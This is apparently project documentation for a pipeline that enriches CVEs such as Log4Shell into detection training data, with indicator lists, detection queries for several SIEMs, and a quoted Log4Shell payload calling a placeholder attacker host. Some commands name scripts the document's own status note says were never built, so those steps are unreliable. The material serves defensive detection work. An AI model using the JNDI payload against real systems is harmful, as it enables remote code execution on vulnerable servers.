# CVE Enrichment Workflow

> **Status (2026-10-16):** some of what this document names was never built: `scripts/enrich_cves.py` and `validate_training_data.py`; the dataset files it shows are examples of output, not files in the repository. What exists: `scripts/config/` (`setup_knowledge_base.py`, `import_community_rules.py`, `build_embeddings.py`, `search_similar_detections.py`, `validate_detections.py`, `quickstart_rag.py`), `scripts/ai/` (`setup_local_llm.py`, `train_ai.py`), `scripts/data/` and `scripts/validation/`: see [SCRIPTS.md](../SCRIPTS.md).

Complete workflow for enriching CVEs with blog posts and technical analysis to generate high-fidelity detection training data.

## Overview

The CVE enrichment pipeline transforms raw CVE data into comprehensive training examples by:

1. **Fetching CVE data** from NVD (National Vulnerability Database)
2. **Searching for related content** (blog posts, POCs, threat reports)
3. **Extracting technical indicators** (commands, files, network activity)
4. **Mapping to MITRE ATT&CK** techniques
5. **Generating training examples** for LLM fine-tuning

## Architecture

```
┌─────────────────────────────────────────────────────────────────────┐
│                     CVE Enrichment Pipeline                          │
├─────────────────────────────────────────────────────────────────────┤
│                                                                      │
│  CVE ID                                                              │
│    │                                                                 │
│    ├─▶ Fetch from NVD                                               │
│    │     • Description                                               │
│    │     • CVSS Score                                                │
│    │     • Affected Products (CPE)                                   │
│    │     • CWE (Weakness Type)                                       │
│    │                                                                 │
│    ├─▶ Search Related Content                                       │
│    │     • ExploitDB POCs                                            │
│    │     • GitHub Exploit Repos                                      │
│    │     • Security Blog Posts                                       │
│    │     │   - Google Project Zero                                   │
│    │     │   - MSRC                                                  │
│    │     │   - Mandiant                                              │
│    │     │   - CrowdStrike                                           │
│    │     │   - Recorded Future                                       │
│    │     • Threat Reports                                            │
│    │                                                                 │
│    ├─▶ Extract Indicators                                           │
│    │     • Commands (cmd, PowerShell, bash)                          │
│    │     • Files (executables, DLLs, paths)                          │
│    │     • Registry Keys                                             │
│    │     • Network (IPs, domains, ports)                             │
│    │     • Processes                                                 │
│    │     • Hashes (MD5, SHA1, SHA256)                                │
│    │                                                                 │
│    ├─▶ Map to MITRE ATT&CK                                          │
│    │     • Identify Techniques                                       │
│    │     • Determine Tactics                                         │
│    │     • Assign Confidence                                         │
│    │                                                                 │
│    └─▶ Generate Training Example                                    │
│          • Detection Context                                         │
│          • Indicator Sets                                            │
│          • Technique Mappings                                        │
│          • Empty Detection Arrays (for manual completion)            │
│                                                                      │
└─────────────────────────────────────────────────────────────────────┘
```

## Quick Start

### 1. Enrich a Single CVE

```bash
# Enrich CVE-2021-44228 (Log4Shell)
python scripts/ai/train_ai.py cve --cves CVE-2021-44228

# Output files:
# ✓ archer/ai/training/datasets/cve_data/cache/CVE-2021-44228.json
# ✓ archer/ai/training/datasets/cve_data/enriched/CVE-2021-44228.json
# ✓ archer/ai/training/datasets/cve_data/training_examples/CVE-2021-44228_training.json
```

### 2. Enrich High-Severity CVEs from 2024

```bash
# Enrich top 50 critical/high CVEs from 2024
python scripts/ai/train_ai.py cve --year 2024 --min-cvss 7.0 --limit 50
```

### 3. Enrich ITW Exploits Only

```bash
# Focus on CVEs with in-the-wild exploitation
python scripts/ai/train_ai.py cve --year 2024 --itw-only --min-cvss 8.0
```

## Complete Example: Log4Shell (CVE-2021-44228)

### Step 1: Run Enrichment

```bash
python scripts/ai/train_ai.py cve --cves CVE-2021-44228
```

### Step 2: Review Enriched CVE

```bash
cat archer/ai/training/datasets/cve_data/enriched/CVE-2021-44228.json | jq .
```

**Enriched Output**:

```json
{
  "cve_id": "CVE-2021-44228",
  "cve_data": {
    "id": "CVE-2021-44228",
    "description": "Apache Log4j2 2.0-beta9 through 2.15.0 (excluding 2.12.2, 2.12.3, and 2.3.1) JNDI features used in configuration, log messages, and parameters do not protect against attacker controlled LDAP and other JNDI related endpoints...",
    "cvss_score": 10.0,
    "published_date": "2021-12-10T10:15Z",
    "references": [
      "https://logging.apache.org/log4j/2.x/security.html",
      "https://www.lunasec.io/docs/blog/log4j-zero-day/"
    ],
    "cpe": ["cpe:2.3:a:apache:log4j:2.0:*"],
    "weakness": "CWE-502"
  },
  "related_content": {
    "exploits": [
      {
        "source": "github",
        "url": "https://github.com/kozmer/log4j-shell-poc",
        "description": "A Proof-Of-Concept for the CVE-2021-44228 vulnerability"
      }
    ],
    "blog_posts": [
      {
        "source": "lunasec",
        "url": "https://www.lunasec.io/docs/blog/log4j-zero-day/",
        "content": "On December 9th, 2021, a 0-day exploit in the popular Java logging library log4j (version 2) was discovered that results in Remote Code Execution (RCE)..."
      },
      {
        "source": "crowdstrike",
        "url": "https://www.crowdstrike.com/blog/log4j2-vulnerability-analysis-and-mitigation-recommendations/",
        "content": "CrowdStrike Intelligence is tracking widespread exploitation of CVE-2021-44228..."
      }
    ],
    "threat_reports": []
  },
  "indicators": {
    "cmd": [
      "${jndi:ldap://",
      "${jndi:rmi://",
      "${jndi:dns://",
      "wget http://",
      "curl http://"
    ],
    "file": [
      "log4j-core-2.",
      "JndiLookup.class"
    ],
    "net": [
      "ldap://",
      "rmi://",
      ":1389",
      ":389"
    ],
    "proc": [
      "java"
    ],
    "hash": []
  },
  "attack_techniques": [
    {
      "technique_id": "T1190",
      "technique_name": "Exploit Public-Facing Application",
      "tactic": "Initial Access",
      "confidence": "high"
    },
    {
      "technique_id": "T1203",
      "technique_name": "Exploitation for Client Execution",
      "tactic": "Execution",
      "confidence": "high"
    }
  ],
  "detection_context": {
    "cve_id": "CVE-2021-44228",
    "severity": "critical",
    "affected_products": ["cpe:2.3:a:apache:log4j:2.0:*"],
    "weakness": "CWE-502",
    "technical_analysis": [
      {
        "source": "nvd",
        "type": "description",
        "content": "Apache Log4j2 2.0-beta9 through 2.15.0..."
      },
      {
        "source": "blog",
        "type": "technical_analysis",
        "content": "On December 9th, 2021, a 0-day exploit...",
        "url": "https://www.lunasec.io/docs/blog/log4j-zero-day/"
      }
    ],
    "indicators": {...},
    "attack_techniques": [...],
    "exploit_available": true,
    "itw_exploitation": true
  }
}
```

### Step 3: Review Generated Training Example

```bash
cat archer/ai/training/datasets/cve_data/training_examples/CVE-2021-44228_training.json | jq .
```

**Training Example Output**:

```json
{
  "task": "detection_generation",
  "input": {
    "technique_id": "T1190",
    "technique_name": "Exploit Public-Facing Application",
    "description": "CVE-2021-44228 - Apache Log4j2 2.0-beta9 through 2.15.0 JNDI features used in configuration, log messages, and parameters do not protect against attacker controlled LDAP and other JNDI related endpoints...\n\nMITRE Technique: Exploit Public-Facing Application\n\nSeverity: CRITICAL (CVSS: 10.0)\n\n⚠️ PUBLIC EXPLOIT AVAILABLE\n⚠️ IN-THE-WILD EXPLOITATION OBSERVED\n\nSource: blog\nOn December 9th, 2021, a 0-day exploit in the popular Java logging library log4j (version 2) was discovered that results in Remote Code Execution (RCE). The vulnerability has been found in Log4j versions 2.0-beta9 to 2.15.0...",
    "platforms": ["Linux", "Windows"],
    "threat_intel": "Public exploit code available. Active in-the-wild exploitation observed. Referenced in 2 threat intelligence report(s).",
    "related_cves": ["CVE-2021-44228"]
  },
  "output": {
    "detections": [],
    "indicators": {
      "cmd": ["${jndi:ldap://", "${jndi:rmi://", "${jndi:dns://"],
      "file": ["log4j-core-2.", "JndiLookup.class"],
      "net": ["ldap://", "rmi://", ":1389"],
      "port": ["1389", "389"],
      "protocol": ["LDAP", "RMI"],
      "service": []
    },
    "metadata": {
      "cve_id": "CVE-2021-44228",
      "cvss_score": 10.0,
      "severity": "critical",
      "exploit_available": true,
      "itw_exploitation": true
    }
  }
}
```

### Step 4: Add Detection Queries

Edit `archer/ai/training/datasets/cve_data/training_examples/CVE-2021-44228_training.json` and add platform-specific detections to the empty `detections` array:

```json
{
  "detections": [
    {
      "platform": "splunk",
      "query": "index=web_logs OR index=app_logs OR index=waf_logs\n| regex _raw=\".*\\$\\{jndi:(ldap|rmi|dns|ldaps|iiop)://.*\\}.*\"\n| stats count by src_ip, dest_ip, uri_path, user_agent, _time\n| where count > 0",
      "confidence": "high",
      "false_positive_rate": "very_low",
      "data_sources": [
        "Web Access Logs",
        "Application Logs",
        "WAF Logs",
        "Network Traffic Logs"
      ],
      "tuning_notes": "Monitor for ${jndi:*} patterns in HTTP headers, request bodies, and user-agent strings. Very low FP rate as this pattern is highly specific to Log4Shell exploitation."
    },
    {
      "platform": "elastic",
      "query": "{\n  \"query\": {\n    \"bool\": {\n      \"should\": [\n        {\"regexp\": {\"http.request.body.content\": \".*\\\\$\\\\{jndi:(ldap|rmi|dns|ldaps|iiop)://.*\"}},\n        {\"regexp\": {\"url.original\": \".*\\\\$\\\\{jndi:(ldap|rmi|dns|ldaps|iiop)://.*\"}},\n        {\"regexp\": {\"http.request.headers.user-agent\": \".*\\\\$\\\\{jndi:(ldap|rmi|dns|ldaps|iiop)://.*\"}},\n        {\"regexp\": {\"http.request.headers.*\": \".*\\\\$\\\\{jndi:(ldap|rmi|dns|ldaps|iiop)://.*\"}}\n      ],\n      \"minimum_should_match\": 1\n    }\n  }\n}",
      "confidence": "high",
      "false_positive_rate": "very_low"
    },
    {
      "platform": "mde",
      "query": "DeviceNetworkEvents\n| where RemoteUrl has_any (\"ldap://\", \"rmi://\", \"ldaps://\")\n| where InitiatingProcessFileName =~ \"java.exe\" or InitiatingProcessFileName =~ \"javaw.exe\"\n| where RemotePort in (389, 636, 1389)\n| project Timestamp, DeviceName, InitiatingProcessFileName, InitiatingProcessCommandLine, RemoteUrl, RemoteIP, RemotePort\n| where InitiatingProcessCommandLine has \"log4j\"",
      "confidence": "high",
      "false_positive_rate": "low"
    },
    {
      "platform": "secops",
      "query": "rule log4shell_exploitation {\n  meta:\n    description = \"Detects Log4Shell exploitation attempts via JNDI injection\"\n    severity = \"CRITICAL\"\n\n  events:\n    $e.metadata.event_type = \"NETWORK_HTTP\"\n    (\n      re.regex($e.network.http.user_agent, `.*\\$\\{jndi:(ldap|rmi|dns)://.*`) or\n      re.regex($e.target.url, `.*\\$\\{jndi:(ldap|rmi|dns)://.*`) or\n      re.regex($e.network.http.referrer, `.*\\$\\{jndi:(ldap|rmi|dns)://.*`)\n    )\n\n  condition:\n    $e\n}",
      "confidence": "high",
      "false_positive_rate": "very_low"
    }
  ]
}
```

### Step 5: Validate Training Example

```bash
# Validate JSONL format and query syntax
python scripts/validate_training_data.py archer/ai/training/datasets/cve_data/training_examples/CVE-2021-44228_training.json
```

### Step 6: Add to Training Dataset

```bash
# Convert to JSONL format
cat archer/ai/training/datasets/cve_data/training_examples/CVE-2021-44228_training.json | jq -c . >> archer/ai/training/datasets/cve_training.jsonl
```

## Workflow for Multiple CVEs

### 1. Identify Priority CVEs

```bash
# Create a list of high-impact CVEs
cat > priority_cves.txt << EOF
CVE-2021-44228
CVE-2021-26855
CVE-2021-34473
CVE-2021-34527
CVE-2020-1472
CVE-2019-0708
CVE-2017-0144
EOF
```

### 2. Batch Enrich

```bash
# Enrich all CVEs from file
python scripts/ai/train_ai.py cve --file priority_cves.txt

# Output: cve_batch_YYYYMMDD_HHMMSS.jsonl
```

### 3. Review and Add Detections

```bash
# Review each enriched CVE
for cve in $(cat priority_cves.txt); do
    echo "=== Reviewing $cve ==="
    cat archer/ai/training/datasets/cve_data/enriched/$cve.json | jq '.detection_context'
done
```

### 4. Add Detections to Training Examples

Manually edit each training example to add platform-specific detections.

### 5. Combine into Training Dataset

```bash
# Merge all training examples
cat archer/ai/training/datasets/cve_data/training_examples/*_training.json | jq -c . > archer/ai/training/datasets/cve_training.jsonl

# Verify count
wc -l archer/ai/training/datasets/cve_training.jsonl
```

## Adding Blog Posts Manually

If the automatic search doesn't find relevant blog posts:

### 1. Create Blog Post JSON

```bash
cat > archer/ai/training/datasets/blog_posts/log4shell_analysis.json << 'EOF'
{
  "title": "Log4Shell: RCE 0-day exploit found in log4j 2",
  "author": "LunaSec",
  "url": "https://www.lunasec.io/docs/blog/log4j-zero-day/",
  "date": "2021-12-09",
  "content": "On December 9th, 2021, a 0-day exploit in the popular Java logging library log4j (version 2) was discovered that results in Remote Code Execution (RCE) by logging a certain string. This vulnerability has been found in Log4j versions 2.0-beta9 to 2.15.0 (excluding 2.12.2, 2.12.3, and 2.3.1).\n\nThe vulnerability works by abusing a feature in log4j that allows for lookups to be performed within log messages. An attacker can craft a malicious payload like ${jndi:ldap://attacker.com/a} that, when logged, will cause the application to reach out to the attacker's server and execute arbitrary code.",
  "cves": ["CVE-2021-44228"],
  "tags": ["log4j", "java", "rce", "jndi", "ldap"]
}
EOF
```

### 2. Re-run Enrichment

```bash
python scripts/enrich_cves.py --cves CVE-2021-44228
```

The pipeline will now include this blog post in the enrichment.

## Training with Enriched CVEs

Once you have enriched CVEs with manual detections:

```bash
# Train LLM with CVE data
python -m archer.ai.training.pipelines.training \
    --data archer/ai/training/datasets/cve_training.jsonl \
    --base-model llama3.1:70b \
    --epochs 5 \
    --output archer/ai/training/models/fine_tuned/cve-detection-v1
```

## Best Practices

### 1. Prioritize High-Impact CVEs

Focus on:
- **ITW Exploitation**: CVEs actively exploited in the wild
- **Public POCs**: CVEs with working exploit code
- **Critical Severity**: CVSS >= 9.0
- **Well-Documented**: Multiple blog posts with technical analysis

### 2. Quality Over Quantity

- 50 high-quality enriched CVEs with detections > 500 CVEs without detections
- Each CVE should have 3+ blog posts with technical analysis
- All platforms should have detection queries
- Queries should be tested for syntax correctness

### 3. Validate Everything

- Check blog post relevance
- Verify indicator extraction accuracy
- Test detection queries
- Validate ATT&CK technique mappings

### 4. Document Your Work

- Add comments to complex queries
- Include tuning guidance
- Document data source requirements
- Note known limitations

## Metrics to Track

- **Total CVEs enriched**: Target 200+
- **CVEs with exploits**: Target 80%+
- **CVEs with ITW exploitation**: Target 50%+
- **CVEs with detections**: Target 100%
- **Blog posts per CVE**: Target 3+
- **Platforms per CVE**: Target 4 (all platforms)
- **High confidence detections**: Target 80%+

## Troubleshooting

### Issue: No blog posts found

**Solution**: Add blog posts manually to `archer/ai/training/datasets/blog_posts/`

### Issue: Indicators not extracted correctly

**Solution**: Review and manually add indicators to enriched CVE JSON

### Issue: Wrong ATT&CK technique mapping

**Solution**: Edit enriched CVE JSON and update `attack_techniques` array

### Issue: Training example format invalid

**Solution**: Validate with `jq` and fix JSON syntax errors

## Next Steps

1. **Enrich Priority CVEs**: Start with top 50 critical CVEs
2. **Add Detections**: Write platform-specific queries
3. **Validate Dataset**: Ensure quality and correctness
4. **Train Model**: Fine-tune LLM with enriched CVE data
5. **Evaluate**: Test model on held-out CVEs
6. **Iterate**: Add more CVEs based on performance
